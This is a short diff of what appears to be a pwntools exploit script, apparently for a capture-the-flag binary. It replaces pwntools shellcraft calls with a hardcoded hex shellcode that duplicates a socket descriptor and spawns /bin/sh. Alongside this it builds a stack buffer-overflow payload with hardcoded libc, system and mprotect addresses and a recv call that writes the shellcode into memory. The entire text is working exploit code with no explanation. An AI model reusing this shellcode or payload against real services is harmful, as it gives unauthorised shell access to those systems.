@@ -22,10 +22,7 @@ system = 0xf7e4bda0
 libcbase = 0xf7e11000
 mprotect = libcbase+0xe2d50
 
-shellcode  = ""
-shellcode += shellcraft.i386.linux.dupio(4)
-shellcode += shellcraft.i386.linux.sh()
-shellcode  = asm(shellcode)
+shellcode =  "6a045b6a0359496a3f58cd8075f86a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80".decode("hex")
 
 payload ="a"*(0x408+4)
 payload+=p32(recv_plt)		# write shellcode in data section
